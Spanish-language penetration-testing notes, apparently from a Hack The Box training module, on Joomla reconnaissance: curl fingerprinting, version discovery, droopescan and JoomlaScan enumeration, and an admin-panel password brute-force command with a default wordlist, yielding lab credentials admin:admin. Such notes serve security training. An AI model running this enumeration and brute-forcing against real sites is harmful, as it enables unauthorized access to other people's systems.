
## 1. Identificar Joomla

### Comprobar el código fuente

```
curl -s http://TARGET/ | grep Joomla
```

Busca referencias como:

```
<meta name="generator" content="Joomla! - Open Source Content Management" />
```

### Revisar `robots.txt`

```
curl -s http://TARGET/robots.txt
```

Puede revelar rutas como:

- `/administrator/` — panel de administración.
    
- `/components/` — componentes.
    
- `/plugins/` — plugins.
    
- `/modules/` — módulos.
    
- `/templates/` — plantillas.
    

### Identificar la versión

**README.txt:**

```
curl -s http://TARGET/README.txt | head -n 5
```

**Archivo XML:**

```
curl -s http://TARGET/administrator/manifests/files/joomla.xml | xmllint --format -
```

Busca la etiqueta `<version>`.

**Archivo de caché:**

```
curl -s http://TARGET/plugins/system/cache/cache.xml
```

También puede ayudar a identificar aproximadamente la versión.

## 2. Enumerar con droopescan

Herramienta para detectar CMS y encontrar información relacionada con sus versiones y rutas.

### Instalar

```
sudo pip3 install droopescan
```

### Escanear Joomla

```
droopescan scan joomla --url http://TARGET/
```

Puede mostrar:

- Posibles versiones de Joomla.
    
- Panel de inicio de sesión.
    
- Archivos interesantes.
    
- Información adicional sobre la instalación.

## 3. Enumerar con JoomlaScan

Herramienta antigua que puede encontrar componentes, directorios accesibles y archivos relacionados con extensiones.

El material indica que necesita Python 2.7.

### Instalar dependencia

```
python2 -m pip install bs4
```

### Ejecutar

```
python2 joomlascan.py -u http://TARGET/
```

Busca resultados como:

- `com_admin`
    
- `com_ajax`
    
- `com_banners`
    
- Directorios accesibles.
    
- Archivos XML de componentes.
    

**Importante:** JoomlaScan está desactualizado, así que sus resultados pueden ser limitados.

## 4. Panel de administración

La ruta habitual es:

```
http://TARGET/administrator/
```

Página de acceso habitual:

```
http://TARGET/administrator/index.php
```

El usuario administrador predeterminado suele ser `admin`, pero la contraseña se establece durante la instalación.

Los errores de inicio de sesión pueden ser genéricos, por lo que no siempre es posible enumerar usuarios directamente.

## 5. Fuerza bruta de contraseñas

Si estás autorizado a probar el acceso, puedes comprobar contraseñas débiles mediante el script de fuerza bruta mostrado en el módulo.

Ejemplo del material:

```
sudo python3 joomla-brute.py \
-u http://TARGET \
-w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt \
-usr admin
```

En el ejemplo de HTB, se encontraron estas credenciales:

```
admin:admin
```
